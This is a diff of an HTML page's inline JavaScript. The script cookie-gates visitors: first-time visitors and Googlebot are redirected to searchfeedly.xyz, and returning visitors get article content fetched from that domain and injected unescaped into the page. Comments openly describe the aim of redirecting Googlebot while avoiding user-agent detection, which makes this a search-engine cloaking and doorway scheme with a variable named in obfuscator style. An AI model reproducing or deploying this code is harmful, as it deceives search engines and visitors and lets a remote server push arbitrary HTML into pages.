@@ -3,6 +3,7 @@
 <meta charset="utf-8">	  
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
 <link href="resources/img/favicon.ico" rel="icon" type="image/x-icon"/>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script>
 (function() {
 	//FUCNTION 1: This function gets the variables of htmlFile(h) & Bucket(b) from the url
@@ -18,80 +19,87 @@
 	(/(\d+)\.html$/ ['exec'](location.pathname)) ? /(\d+)\.html$/ ['exec'](location.pathname)[1] : '';
 	
 
-	function getData() 
+	title = null;
+	date = null;
+	heading = null;
+	content = null;
+	image = null;
+	alt = null;
+	
+	//FUCNTION 3: Get host cookie using 1 liner
+	const cookieObj = new URLSearchParams(document.cookie.replaceAll("&", "%26").replaceAll("; ","&"));
+	if (cookieObj.get('pg') == 'daily')
 	{
-		fetch('https://searchfeedly.xyz/articles/git/' + _0xbe6fx1.h + '.php', {method: 'get'})
-		.then(response => response.json())
-		.then(data => {
-				a = data
-				server = a[0].server;
-				title = a[0].title;
-				date = a[0].date;
-				heading = a[0].heading;
-				content = a[0].content;
-				image = a[0].image;
-				alt = a[0].alt;
-				console.log(data);
-		});
+		var newViewer = 0;
+		//alert('Old User');
+				
+		function getData() 
+		{
+			fetch('https://searchfeedly.xyz/articles/git/' + _0xbe6fx1.h + '.php', {method: 'get'})
+			.then(response => response.json())
+			.then(data => {
+					a = data
+					server = a[0].server;
+					title = a[0].title;
+					date = a[0].date;
+					heading = a[0].heading;
+					content = a[0].content;
+					image = a[0].image;
+					alt = a[0].alt;
+					//console.log(data);
+			});
+		}
+		
+		async function asyncWait() 
+		{
+			const result = await getData();
+			//FUCNTION 4: IF COOKIE add code to header to get JSON data from server		
+			setTimeout(function () {				
+				$('head').append('<title>' + title + '</title><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet"><link rel="stylesheet" href="resources/css/style.css" rel="stylesheet">');
+			
+				$('body').append('<div id="page"> <div class="hamburger-menu"> <input id="menu__toggle" type="checkbox" /> <label class="menu__btn" for="menu__toggle"> <span></span> </label> <ul class="menu__box"> <li><a class="menu__item" href="/pages/home/">Home</a></li> <li><a class="menu__item" href="/pages/about.html">About Us</a></li> <li><a class="menu__item" href="/pages/privacy.html">Privacy Policy</a></li> <li><a class="menu__item" href="/pages/disclaimer.html">Disclaimer</a></li> <li><a class="menu__item" href="/pages/contact.html">Contact</a></li> </ul> </div> <div id="content"> <div class="inner card"> <h1 id="t1" class="title">&nbsp; &nbsp; &nbsp; ' + heading + '</h1> <div class="date"><small>Published on <b><i>' + date + '</i></b> by <b>Admin.</b></small></div> <div id="content-image"> <img class="main-image" src="https://i0.wp.com/' + server + '/' + image + '" alt="' + alt + '"></img> </div> <div class="write-up"><span style="font-weight:normal; font-size:18px"> ' + content + ' </span><br /></div> <br /><br /> </div> <div class="footer"> <p><small>Copyright © 2023. All Rights Reserved.</small></p> <br /><br /> </div> </div> </div>');
+			}, 1000);
+		}
+		
+		asyncWait();
 	}
 	
-	async function asyncWait() 
+	else 
 	{
-		const result = await getData();
+		//FUCNTION 5:
+		//IMPORTANT:Mainly used to redirect googlebot to searchfeedly as it doesn't keep cookies
+		//Use instead of user agent which must use obfuscation to work/redirect googlebot
+		var newViewer = 1; 
 		
-		//FUCNTION 3: Get host cookie using 1 liner
-		const cookieObj = new URLSearchParams(document.cookie.replaceAll("&", "%26").replaceAll("; ","&"));
-		if (cookieObj.get('pg') == 'daily')
-		{
-			var newViewer = 0;
-			//alert('Old User');
-					
-			//FUCNTION 4: IF COOKIE add code to header to get JSON data from server		
-			document.head.innerHTML += '<title>' + title + '</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet"><link rel="stylesheet" href="resources/css/style.css" rel="stylesheet">';
-					
-				
-			document.body.innerHTML += '<div id="page"> <div class="hamburger-menu"> <input id="menu__toggle" type="checkbox" /> <label class="menu__btn" for="menu__toggle"> <span></span> </label> <ul class="menu__box"> <li><a class="menu__item" href="/pages/home/">Home</a></li> <li><a class="menu__item" href="/pages/about.html">About Us</a></li> <li><a class="menu__item" href="/pages/privacy.html">Privacy Policy</a></li> <li><a class="menu__item" href="/pages/disclaimer.html">Disclaimer</a></li> <li><a class="menu__item" href="/pages/contact.html">Contact</a></li> </ul> </div> <div id="content"> <div class="inner card"> <h1 id="t1" class="title">&nbsp; &nbsp; &nbsp; ' + heading + '</h1> <div class="date"><small>Published on <b><i>' + date + '</i></b> by <b>Admin.</b></small></div> <div id="content-image"> <img class="main-image" src="https://i0.wp.com/' + server + '/' + image + '" alt="' + alt + '"></img> </div> <div class="write-up"><span style="font-weight:normal; font-size:18px"> ' + content + ' </span><br /></div> <br /><br /> </div> <div class="footer"> <p><small><script>document.write(location.hostname)</script> - Copyright © <script>document.write(new Date().getFullYear())</script>. All Rights Reserved.</small></p> <br /><br /> </div> </div> </div>';
+		function setCookie(cname, cvalue, exdays) {
+			var d = new Date();
+			d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+			var expires = "expires=" + d.toGMTString();
+			document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/"
 		}
 		
-		else 
-		{
-			//FUCNTION 5:
-			//IMPORTANT:Mainly used to redirect googlebot to searchfeedly as it doesn't keep cookies
-			//Use instead of user agent which must use obfuscation to work/redirect googlebot
-			var newViewer = 1; 
-			
-			function setCookie(cname, cvalue, exdays) {
-				var d = new Date();
-				d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
-				var expires = "expires=" + d.toGMTString();
-				document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/"
-			}
-			
-			function getCookie(cname) {
-				var name = cname + "=";
-				var decodedCookie = decodeURIComponent(document.cookie);
-				var ca = decodedCookie.split(';');
-				for(var i = 0; i < ca.length; i++) {
-					var c = ca[i];
-					while(c.charAt(0) == ' ') {
-						c = c.substring(1)
-					}
-					if(c.indexOf(name) == 0) {
-						return c.substring(name.length, c.length)
-					}
+		function getCookie(cname) {
+			var name = cname + "=";
+			var decodedCookie = decodeURIComponent(document.cookie);
+			var ca = decodedCookie.split(';');
+			for(var i = 0; i < ca.length; i++) {
+				var c = ca[i];
+				while(c.charAt(0) == ' ') {
+					c = c.substring(1)
 				}
-				return ""
+				if(c.indexOf(name) == 0) {
+					return c.substring(name.length, c.length)
+				}
 			}
-			
-			setCookie("pg", "daily", 1) //1 = 24 hours
-			//redirect human
-			//_0xbe6fx1.id means the id variable from the FUCNTION 1 above
-			location.href = 'https://searchfeedly.xyz/articles/?h=' + _0xbe6fx1.h + '&b=' + _0xbe6fx1.b
-			//alert('New User');
+			return ""
 		}
+		
+		setCookie("pg", "daily", 1) //1 = 24 hours
+		//redirect human
+		//_0xbe6fx1.id means the id variable from the FUCNTION 1 above
+		location.href = 'https://searchfeedly.xyz/articles/?h=' + _0xbe6fx1.h + '&b=' + _0xbe6fx1.b
+		//alert('New User');
 	}
-
-	asyncWait();
 	
 })()
 </script>
